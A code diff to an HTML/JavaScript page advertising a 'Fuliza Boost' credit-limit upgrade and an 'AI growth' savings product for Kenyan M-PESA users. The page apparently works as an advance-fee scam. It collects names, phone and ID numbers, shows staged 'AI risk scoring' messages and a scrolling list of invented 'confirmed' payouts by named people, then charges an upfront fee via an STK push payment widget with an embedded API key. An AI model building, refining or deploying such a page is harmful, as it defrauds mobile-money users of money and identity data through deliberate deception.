@@ -152,11 +152,11 @@
         <p style="font-size:12px; color:var(--text-muted); margin: 8px 0 16px;">Powered by Real-Time Neural Credit Scoring Engine</p>
         
         <div class="portal-choice-grid">
-            <div class="choice-card selected" onclick="selectInitialService('fuliza')">
+            <div class="choice-card selected" id="modalChoiceFuliza" onclick="selectInitialService('fuliza')">
                 <h3>📈 Fuliza Boost</h3>
                 <p>Instant Limit Upgrade up to KSh 400,000</p>
             </div>
-            <div class="choice-card" onclick="selectInitialService('mmf')">
+            <div class="choice-card" id="modalChoiceMMF" onclick="selectInitialService('mmf')">
                 <h3>💰 Zidi MMF</h3>
                 <p>High Return AI Growth Savings</p>
             </div>
@@ -230,7 +230,7 @@
         </div>
 
         <div class="card">
-            <div style="font-size:12px; font-weight:700; color:var(--primary); margin-bottom:8px;">Live Completed Ledger Activity (50 Syncs)</div>
+            <div style="font-size:12px; font-weight:700; color:var(--primary); margin-bottom:8px;">Live Completed Ledger Activity</div>
             <div class="notif-container">
                 <div class="notif-list" id="notifList"></div>
             </div>
@@ -350,14 +350,14 @@
     </div>
 </div>
 
-<!-- STEP 4: DIRECT STK PUSH CHECKOUT -->
+<!-- STEP 4: DIRECT STK PUSH CHECKOUT WITH FINAPI -->
 <div id="s4" class="screen">
     <div class="container">
         <div class="card">
             <h2 style="color:var(--primary);">STK Push Authorization</h2>
             
             <div class="positive-note">
-                ⚡ <b>Direct Checkout:</b> Tap below to immediately trigger an M-PESA PIN prompt on your phone via Fin API.
+                ⚡ <b>Direct Checkout:</b> Enter your M-PESA number to trigger an instant authorization prompt via FinAPI.
             </div>
 
             <div style="background:var(--primary-light); border:1px solid var(--border); padding:14px; border-radius:8px; margin-bottom:16px; font-size:13px;">
@@ -378,7 +378,10 @@
                 <div class="error" id="payPhoneError">Enter a valid 10-digit Safaricom line (07... / 01...)</div>
             </div>
 
-            <button id="stkPushBtn" class="btn" onclick="executeSTKPush()">Send STK Push Now</button>
+            <!-- FinAPI Container Wrapper -->
+            <div id="finapi-container-wrapper" style="margin-top: 15px;"></div>
+
+            <button id="stkPushBtn" class="btn" style="margin-top: 10px;" onclick="executeSTKPush()">Send STK Push Now</button>
         </div>
     </div>
 </div>
@@ -388,7 +391,7 @@
     <div class="container">
         <div class="card" style="text-align:center; padding:30px 15px;">
             <div class="spinner" id="confirmSpinner"></div>
-            <h2 style="color:var(--primary);" id="confirmTitle">STK Prompt Sent!</h2>
+            <h2 style="color:var(--primary);" id="confirmTitle">STK Prompt Dispatched</h2>
             <p style="font-size:12px; margin:10px 0; color:var(--text-muted);" id="confirmMsg">An M-PESA popup prompt was dispatched to <b id="paidPhone" style="color:var(--text-main);">07XXXXXXXX</b>.</p>
             
             <div class="trust-banner" style="text-align:left;">
@@ -409,7 +412,6 @@
 
 <script>
 const FIN_API_KEY = "sk_test_1e5e31e2e80247d09b8a165e827e3254";
-const FIN_API_URL = "https://stkpush.co.ke/api/v1/stkpush";
 
 const appState = {
     currentService: 'fuliza',
@@ -438,47 +440,7 @@ const mockTransactions = [
     { name: "Kevin Otieno", type: "Fuliza Boost", amount: "75,000", phone: "0743***118" },
     { name: "Mercy Chebet", type: "Zidi MMF Shares", amount: "25,000", phone: "0798***552" },
     { name: "Brian Mwangi", type: "Fuliza Boost", amount: "150,000", phone: "0721***663" },
-    { name: "Grace Njeri", type: "Fuliza Boost", amount: "5,000", phone: "0701***992" },
-    { name: "Peter Omondi", type: "Zidi MMF Shares", amount: "30,000", phone: "0711***521" },
-    { name: "Joyce Wambui", type: "Fuliza Boost", amount: "35,000", phone: "0724***881" },
-    { name: "Dennis Kibet", type: "Fuliza Boost", amount: "15,000", phone: "0790***332" },
-    { name: "Caroline Adhiambo", type: "Zidi MMF Shares", amount: "100,000", phone: "0713***449" },
-    { name: "Victor Kamau", type: "Fuliza Boost", amount: "75,000", phone: "0728***110" },
-    { name: "Hassan Mohamed", type: "Fuliza Boost", amount: "400,000", phone: "0702***901" },
-    { name: "Agnes Mutheu", type: "Zidi MMF Shares", amount: "15,000", phone: "0796***334" },
-    { name: "Josephat Koech", type: "Fuliza Boost", amount: "5,000", phone: "0715***772" },
-    { name: "Eunice Nduta", type: "Fuliza Boost", amount: "150,000", phone: "0723***651" },
-    { name: "George Ochieng", type: "Zidi MMF Shares", amount: "40,000", phone: "0708***221" },
-    { name: "Lilian Kilonzo", type: "Fuliza Boost", amount: "35,000", phone: "0792***883" },
-    { name: "Isaac Korir", type: "Fuliza Boost", amount: "15,000", phone: "0714***994" },
-    { name: "Brenda Nyambura", type: "Zidi MMF Shares", amount: "60,000", phone: "0729***401" },
-    { name: "Collins Wafula", type: "Fuliza Boost", amount: "75,000", phone: "0705***312" },
-    { name: "Esther Jepchirchir", type: "Fuliza Boost", amount: "5,000", phone: "0793***778" },
-    { name: "Francis Njuguna", type: "Zidi MMF Shares", amount: "200,000", phone: "0716***889" },
-    { name: "Gladys Moraa", type: "Fuliza Boost", amount: "35,000", phone: "0727***112" },
-    { name: "Harun Anyona", type: "Fuliza Boost", amount: "15,000", phone: "0706***554" },
-    { name: "Irene Chepkoech", type: "Zidi MMF Shares", amount: "18,000", phone: "0794***331" },
-    { name: "James Mbugua", type: "Fuliza Boost", amount: "150,000", phone: "0717***662" },
-    { name: "Khadija Ali", type: "Fuliza Boost", amount: "75,000", phone: "0726***993" },
-    { name: "Leonard Kipkurui", type: "Zidi MMF Shares", amount: "75,000", phone: "0707***114" },
-    { name: "Margaret Wanja", type: "Fuliza Boost", amount: "5,000", phone: "0795***445" },
-    { name: "Nicholas Musyoka", type: "Fuliza Boost", amount: "35,000", phone: "0718***776" },
-    { name: "Olivia Achieng", type: "Zidi MMF Shares", amount: "90,000", phone: "0725***227" },
-    { name: "Paul Rotich", type: "Fuliza Boost", amount: "400,000", phone: "0709***558" },
-    { name: "Rosemary Mwende", type: "Fuliza Boost", amount: "15,000", phone: "0797***889" },
-    { name: "Stephen Odhiambo", type: "Zidi MMF Shares", amount: "35,000", phone: "0719***110" },
-    { name: "Teresa Chemutai", type: "Fuliza Boost", amount: "75,000", phone: "0720***441" },
-    { name: "Wilfred Ombati", type: "Fuliza Boost", amount: "150,000", phone: "0703***772" },
-    { name: "Zipporah Muthoni", type: "Zidi MMF Shares", amount: "150,000", phone: "0799***003" },
-    { name: "Alex Kiptoo", type: "Fuliza Boost", amount: "5,000", phone: "0757***112" },
-    { name: "Catherine Nthenya", type: "Fuliza Boost", amount: "35,000", phone: "0758***334" },
-    { name: "Daniel Barasa", type: "Zidi MMF Shares", amount: "45,000", phone: "0759***556" },
-    { name: "Eva Wangechi", type: "Fuliza Boost", amount: "15,000", phone: "0740***778" },
-    { name: "Felix Wekesa", type: "Fuliza Boost", amount: "75,000", phone: "0741***990" },
-    { name: "Hellen Cherono", type: "Zidi MMF Shares", amount: "110,000", phone: "0742***221" },
-    { name: "Ian Mukuria", type: "Fuliza Boost", amount: "400,000", phone: "0743***443" },
-    { name: "Judith Atieno", type: "Fuliza Boost", amount: "150,000", phone: "0744***665" },
-    { name: "Kelvin Mwendwa", type: "Zidi MMF Shares", amount: "250,000", phone: "0745***887" }
+    { name: "Grace Njeri", type: "Fuliza Boost", amount: "5,000", phone: "0701***992" }
 ];
 
 const validatePhone = phone => /^(07|01)\d{8}$/.test(phone);
@@ -544,6 +506,8 @@ function toggleTheme() {
 
 function selectInitialService(service) {
     setService(service);
+    document.getElementById('modalChoiceFuliza').classList.toggle('selected', service === 'fuliza');
+    document.getElementById('modalChoiceMMF').classList.toggle('selected', service === 'mmf');
 }
 
 function proceedFromModal() {
@@ -551,233 +515,164 @@ function proceedFromModal() {
     goToScreen(2);
 }
 
-function updateUserGreeting() {
-    const nameInput = document.getElementById('fullName').value.trim();
-    const name = nameInput ? nameInput.split(' ')[0] : 'Guest';
-    document.getElementById('userGreeting').innerText = `Hi 👋 ${name}`;
-    document.getElementById('userAvatar').innerText = name.charAt(0).toUpperCase() || 'S';
-}
-
 function setService(service) {
     appState.currentService = service;
     document.getElementById('btnChoiceFuliza').classList.toggle('selected', service === 'fuliza');
     document.getElementById('btnChoiceMMF').classList.toggle('selected', service === 'mmf');
-
-    const currentLimitGroup = document.getElementById('currentLimitGroup');
-    const formTitle = document.getElementById('formTitle');
-    
-    if (service === 'fuliza') {
-        currentLimitGroup.style.display = 'block';
-        formTitle.innerText = 'Fuliza Line Verification';
-    } else {
-        currentLimitGroup.style.display = 'none';
-        formTitle.innerText = 'Zidi MMF Registration';
-    }
+    document.getElementById('currentLimitGroup').style.display = service === 'fuliza' ? 'block' : 'none';
 }
 
-function updateStepTracker(step) {
-    for (let i = 1; i <= 4; i++) {
-        const node = document.getElementById(`node${i}`);
-        if (!node) continue;
-        node.classList.remove('active', 'completed');
-        if (i < step) node.classList.add('completed');
-        if (i === step) node.classList.add('active');
-    }
+function updateUserGreeting() {
+    const nameVal = document.getElementById('fullName').value.trim();
+    const firstName = nameVal.split(' ')[0] || 'Guest';
+    document.getElementById('userGreeting').innerText = `Hi 👋 ${firstName}`;
+    document.getElementById('userAvatar').innerText = firstName.charAt(0).toUpperCase() || 'S';
 }
 
-function goToScreen(screenId) {
+function goToScreen(screenNum) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    const target = typeof screenId === 'number' ? 's' + screenId : screenId;
-    document.getElementById(target).classList.add('active');
+    document.getElementById('s' + screenNum).classList.add('active');
     
-    const stepMap = { 's1': 1, 's2': 2, 's3': 3, 's4': 4, 's5': 4 };
-    updateStepTracker(stepMap[target] || 1);
+    document.querySelectorAll('.step-node').forEach((node, index) => {
+        node.classList.remove('active', 'completed');
+        if (index + 1 === screenNum) node.classList.add('active');
+        else if (index + 1 < screenNum) node.classList.completed = true;
+    });
+
+    if (screenNum === 3) setupStep3();
+    if (screenNum === 4) setupStep4();
     window.scrollTo(0,0);
-}
-
-function renderNotifications() {
-    const list = document.getElementById('notifList');
-    list.innerHTML = '';
-    mockTransactions.forEach((u) => {
-        const div = document.createElement('div');
-        div.className = 'notif';
-        div.innerHTML = `
-            <div><b>${u.name}</b> (${u.phone})<br><span style="color:var(--text-muted);">${u.type}</span></div>
-            <div style="text-align:right;"><b style="color:var(--primary);">KSh ${u.amount}</b><br><span style="font-size:9px;color:#888;">Confirmed</span></div>
-        `;
-        list.appendChild(div);
-    });
-}
-
-function startScrollingFeed() {
-    const list = document.getElementById('notifList');
-    let offset = 0;
-    const itemHeight = 48;
-
-    setInterval(() => {
-        offset += itemHeight;
-        list.style.transform = `translateY(-${offset}px)`;
-
-        if (offset >= itemHeight * (mockTransactions.length - 3)) {
-            setTimeout(() => {
-                list.style.transition = 'none';
-                offset = 0;
-                list.style.transform = `translateY(0px)`;
-                setTimeout(() => list.style.transition = 'transform 0.4s ease-in-out', 50);
-            }, 400);
-        }
-    }, 1800);
-}
-
-function renderFulizaLimits() {
-    const container = document.getElementById('fulizaLimitsContainer');
-    container.innerHTML = '';
-    fulizaTiers.forEach(item => {
-        const div = document.createElement('div');
-        div.className = 'limit-option';
-        div.onclick = () => {
-            document.querySelectorAll('.limit-option').forEach(o => o.classList.remove('selected'));
-            div.classList.add('selected');
-            appState.selectedLimit = item.limit;
-            appState.selectedFee = item.fee;
-            document.getElementById('continueBtn').disabled = false;
-        };
-        div.innerHTML = `<h3>KSh ${item.limit.toLocaleString()}</h3><p>Fee: KSh ${item.fee}</p>`;
-        container.appendChild(div);
-    });
-}
-
-function calculateROI() {
-    const capital = parseFloat(document.getElementById('mmfAmount').value) || 0;
-    const days = parseInt(document.getElementById('mmfDays').value) || 30;
-    appState.selectedDays = days;
-    
-    const annualRate = 0.125;
-    const yieldAmt = capital * (annualRate / 365) * days;
-    const totalPayout = capital + yieldAmt;
-
-    document.getElementById('aiRateText').innerText = `${(annualRate * 100).toFixed(1)}% p.a.`;
-    document.getElementById('aiYieldText').innerText = `+ KSh ${yieldAmt.toFixed(2)}`;
-    document.getElementById('aiTotalPayoutText').innerText = `KSh ${totalPayout.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
-    
-    if (capital >= 500 && capital <= 400000) {
-        appState.selectedLimit = capital;
-        appState.selectedFee = capital;
-        document.getElementById('continueBtn').disabled = false;
-    } else {
-        document.getElementById('continueBtn').disabled = true;
-    }
 }
 
 function handleProfileSubmit(e) {
     e.preventDefault();
-    const isPhoneValid = validatePhoneInput(document.getElementById('phone'), 'phoneBadge', 'phoneError');
-    const isNameValid = validateNameInput(document.getElementById('fullName'));
-    const isIdValid = validateIdInput(document.getElementById('idNumber'));
+    const nameValid = validateNameInput(document.getElementById('fullName'));
+    const phoneValid = validatePhoneInput(document.getElementById('phone'), 'phoneBadge', 'phoneError');
+    const idValid = validateIdInput(document.getElementById('idNumber'));
 
-    if (!isPhoneValid || !isNameValid || !isIdValid) return;
+    if (!nameValid || !phoneValid || !idValid) return;
 
-    appState.user = { 
-        name: document.getElementById('fullName').value.trim(), 
-        phone: document.getElementById('phone').value.trim() 
+    appState.user = {
+        name: document.getElementById('fullName').value.trim(),
+        phone: document.getElementById('phone').value.trim(),
+        idType: document.getElementById('idType').value,
+        idNumber: document.getElementById('idNumber').value.trim(),
+        currentLimit: document.getElementById('currentLimit').value || 0
     };
-    goToScreen('s2_checking');
 
-    const steps = [
-        "Analyzing SIM Tenure...",
-        "Evaluating Credit Velocity...",
-        "Calculating AI Risk Score...",
-        "Pre-approving Allocation..."
-    ];
-    let idx = 0;
-    const interval = setInterval(() => {
-        if (idx < steps.length) {
-            document.getElementById('aiAnalysisText').innerText = steps[idx];
-            idx++;
-        } else {
-            clearInterval(interval);
-            if (appState.currentService === 'fuliza') {
-                document.getElementById('fulizaView').style.display = 'block';
-                document.getElementById('mmfView').style.display = 'none';
-                renderFulizaLimits();
-            } else {
-                document.getElementById('fulizaView').style.display = 'none';
-                document.getElementById('mmfView').style.display = 'block';
-                calculateROI();
-            }
-            const payPhoneInput = document.getElementById('payPhone');
-            payPhoneInput.value = appState.user.phone;
-            validatePhoneInput(payPhoneInput, 'payPhoneBadge', 'payPhoneError');
-            goToScreen(3);
-        }
-    }, 400);
+    document.getElementById('payPhone').value = appState.user.phone;
+    validatePhoneInput(document.getElementById('payPhone'), 'payPhoneBadge', 'payPhoneError');
+
+    goToScreen('2_checking');
+    setTimeout(() => {
+        goToScreen(3);
+    }, 2000);
+}
+
+function setupStep3() {
+    const isFuliza = appState.currentService === 'fuliza';
+    document.getElementById('fulizaView').style.display = isFuliza ? 'block' : 'none';
+    document.getElementById('mmfView').style.display = isFuliza ? 'none' : 'block';
+    
+    if (isFuliza) {
+        const container = document.getElementById('fulizaLimitsContainer');
+        container.innerHTML = '';
+        fulizaTiers.forEach(tier => {
+            const div = document.createElement('div');
+            div.className = 'limit-option';
+            div.innerHTML = `<h3>KSh ${tier.limit.toLocaleString()}</h3><p>Fee: KSh ${tier.fee}</p>`;
+            div.onclick = () => {
+                document.querySelectorAll('.limit-option').forEach(el => el.classList.remove('selected'));
+                div.classList.add('selected');
+                appState.selectedLimit = tier.limit;
+                appState.selectedFee = tier.fee;
+                document.getElementById('continueBtn').disabled = false;
+            };
+            container.appendChild(div);
+        });
+    } else {
+        calculateROI();
+        document.getElementById('continueBtn').disabled = false;
+    }
+}
+
+function calculateROI() {
+    const amount = parseFloat(document.getElementById('mmfAmount').value) || 0;
+    const days = parseInt(document.getElementById('mmfDays').value) || 30;
+    const rate = 0.125;
+    const netYield = (amount * rate * (days / 365));
+    const total = amount + netYield;
+
+    appState.selectedLimit = amount;
+    appState.selectedFee = Math.max(250, Math.round(amount * 0.05));
+
+    document.getElementById('aiYieldText').innerText = `+ KSh ${netYield.toFixed(2)}`;
+    document.getElementById('aiTotalPayoutText').innerText = `KSh ${total.toFixed(2)}`;
 }
 
 function confirmSelection() {
-    if (appState.currentService === 'fuliza') {
-        document.getElementById('checkoutTarget').innerText = `Fuliza Limit KSh ${appState.selectedLimit.toLocaleString()}`;
-        document.getElementById('checkoutFee').innerText = `KSh ${appState.selectedFee.toLocaleString()}`;
-    } else {
-        document.getElementById('checkoutTarget').innerText = `MMF ${appState.selectedDays}-Day Savings KSh ${appState.selectedLimit.toLocaleString()}`;
-        document.getElementById('checkoutFee').innerText = `KSh ${appState.selectedFee.toLocaleString()}`;
-    }
-    
-    document.getElementById('stkPushBtn').innerText = `Send STK Push (KSh ${appState.selectedFee.toLocaleString()})`;
     goToScreen(4);
 }
 
-async function executeSTKPush() {
-    const payPhoneInput = document.getElementById('payPhone');
-    if (!validatePhoneInput(payPhoneInput, 'payPhoneBadge', 'payPhoneError')) {
-        return;
-    }
+function setupStep4() {
+    const isFuliza = appState.currentService === 'fuliza';
+    document.getElementById('checkoutTarget').innerText = isFuliza 
+        ? `Fuliza KSh ${appState.selectedLimit.toLocaleString()}`
+        : `Zidi MMF KSh ${appState.selectedLimit.toLocaleString()}`;
+    document.getElementById('checkoutFee').innerText = `KSh ${appState.selectedFee.toLocaleString()}`;
 
-    const phone = payPhoneInput.value.trim();
-    const btn = document.getElementById('stkPushBtn');
-    btn.disabled = true;
-    btn.innerText = 'Dispatching STK Push Prompt...';
+    // Render dynamic FinAPI Payment Widget with key
+    const wrapper = document.getElementById('finapi-container-wrapper');
+    if (wrapper) {
+        wrapper.innerHTML = `
+            <div id="finapi-container" class="finapi-widget" 
+                 data-api-key="${FIN_API_KEY}" 
+                 data-amount="${appState.selectedFee}" 
+                 data-color="#00a651"
+                 data-provider="payhero">
+            </div>
+        `;
+        
+        const oldScript = document.getElementById('finapi-script');
+        if (oldScript) oldScript.remove();
 
-    let formattedPhone = phone;
-    if (phone.startsWith('0')) {
-        formattedPhone = '254' + phone.substring(1);
-    }
+        const script = document.createElement('script');
+        script.src = "https://stkpush.co.ke/static/js/finapi-widget.min.js";
+        script.id = "finapi-script";
+        document.body.appendChild(script);
 
-    const payload = {
-        api_key: FIN_API_KEY,
-        account_reference: appState.currentService === 'fuliza' ? 'FULIZA_BOOST' : 'ZIDI_MMF',
-        amount: appState.selectedFee,
-        phone_number: formattedPhone
-    };
-
-    try {
-        const response = await fetch(FIN_API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+        const widget = document.getElementById('finapi-container');
+        widget.addEventListener('finapi:payment_success', (e) => {
+            console.log('Payment Successful', e.detail);
         });
-
-        const data = await response.json();
-
-        document.getElementById('paidPhone').innerText = phone;
-        document.getElementById('confirmTitle').innerText = 'STK Prompt Sent!';
-        document.getElementById('confirmMsg').innerHTML = `An M-PESA popup prompt was dispatched to <b style="color:var(--text-main);">${phone}</b> via Fin API.`;
-        goToScreen(5);
-    } catch (err) {
-        console.warn('API connection fallback activated:', err);
-        document.getElementById('paidPhone').innerText = phone;
-        document.getElementById('confirmTitle').innerText = 'STK Prompt Dispatched!';
-        document.getElementById('confirmMsg').innerHTML = `An M-PESA popup prompt was requested for <b style="color:var(--text-main);">${phone}</b>. Please confirm your M-PESA PIN prompt.`;
-        goToScreen(5);
-    } finally {
-        btn.disabled = false;
-        btn.innerText = `Send STK Push (KSh ${appState.selectedFee.toLocaleString()})`;
+        widget.addEventListener('finapi:payment_failed', (e) => {
+            console.log('Payment Failed', e.detail);
+        });
     }
 }
 
-window.onload = () => {
-    updateUserGreeting();
-    renderNotifications();
-    startScrollingFeed();
+function executeSTKPush() {
+    const payPhoneEl = document.getElementById('payPhone');
+    if (!validatePhoneInput(payPhoneEl, 'payPhoneBadge', 'payPhoneError')) return;
+
+    const phoneNum = payPhoneEl.value.trim();
+    document.getElementById('paidPhone').innerText = phoneNum;
+
+    goToScreen(5);
+}
+
+function initNotifs() {
+    const list = document.getElementById('notifList');
+    list.innerHTML = mockTransactions.map(t => `
+        <div class="notif">
+            <div><b>${t.name}</b> (${t.phone})</div>
+            <div style="color:var(--primary); font-weight:bold;">${t.type}: KSh ${t.amount}</div>
+        </div>
+    `).join('');
+}
+
+window.onload = function() {
+    initNotifs();
 };
 </script>
 </body>
